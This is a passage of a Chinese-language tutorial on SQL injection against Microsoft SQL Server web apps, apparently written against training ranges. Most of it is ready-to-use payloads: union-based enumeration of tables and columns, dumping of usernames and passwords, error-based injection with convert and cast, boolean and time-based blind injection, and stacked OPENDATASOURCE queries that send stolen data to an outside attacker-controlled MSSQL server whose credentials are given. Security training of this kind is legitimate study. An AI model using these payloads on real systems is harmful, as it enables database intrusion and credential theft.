    #使用not in获取下一条数据
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe
###  5、查询列名
这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058'-- qwe
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe
###  6、information_schema
值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 table_name from information_schema.tables where table_name <> 'manager'),null -- qwe
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' ),null -- qwe
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id','username')),null -- qwe
###  7、获取数据
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwe
    http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username <> 'admin_mz'-- qwe
解密获取密码
## 0x04 报错注入
mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。
###  1、直接报错
等号两边数据类型不一致配合子查询获取数据。
    #获取数据库库名
    ?id=1' and 1=(select db_name()) -- qwe
    #获取第一个表名
    ?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe
    #将数据连接显示
    ?id=1'  and 1=stuff((select db_name() for xml path('')),1,0,'')--+
###  2、convert()函数
    convert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。
具体用法如下：
    #获取数据库库名
    ?id=1' and 1=convert(int,(select db_name())) -- qwe
    #获取数据库版本
    ?id=1' and 1=convert(int,(select @@version))) -- qwe
###  3、cast()函数
    CAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。
具体用法如下：
    #查询当前数据库
    ?id=1' and 1=(select cast(db_name() as int)) -- qe
    #查询第一个数据表
    ?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe
###  4、数据组合输出
    #将数据表组合输出
    ?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path('')),1,0,'')--+
    #查询users表中的用户名并组合输出
    ?id=1'  and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+
## 0x05 布尔盲注
###  1、查询数据库库名
1、查询数据库库名长度为11
    http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11
2、查询第一个字符的ascii码为109
    http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109
    http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))>109
3、查询第二个字符的ascii码为111
    http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111
4、获取所有ascii码之后，解码获取数据
###  2、查询表名
除了像上面查询库名使用了ascii码外，还可以直接猜解字符串
    http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'
    http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'
## 0x06 延时盲注
###  1、延时函数 WAITFOR DELAY
    语法：n表示延时几秒
    WAITFOR DELAY '0:0:n'id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe
###  2、查询数据
    #判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒
    http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe
    #判断如果第一个表的表名的第一个字符为m，则延时5秒
    http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe
## 0x07 反弹注入
就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。  
反弹注入条件相对苛刻一些，一是需要一台搭建了mssql数据库的vps服务器，二是需要开启堆叠注入。  
反弹注入需要使用opendatasource函数。
    OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。
###  1、环境准备
1、首先打开靶场
3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。
    CREATE TABLE test(name VARCHAR(255))
###  2、获取数据库所有表
1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。
    #查询sysobjects表
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe
    #查询information_schema数据库
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe
2、执行成功页面返回正常。
3、在数据库中成功获取到数据。
###  3、获取数据库admin表中的所有列名
    #查询information_schema数据库
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin'-- qwe
    #查询syscolumns表
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe
###  4、获取数据
1、首先新建一个表，里面放三个字段，分别是id，username和passwd。
    CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))
2、获取admin表中的数据
    ?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe
## 0x08 总结
    完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。
    靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～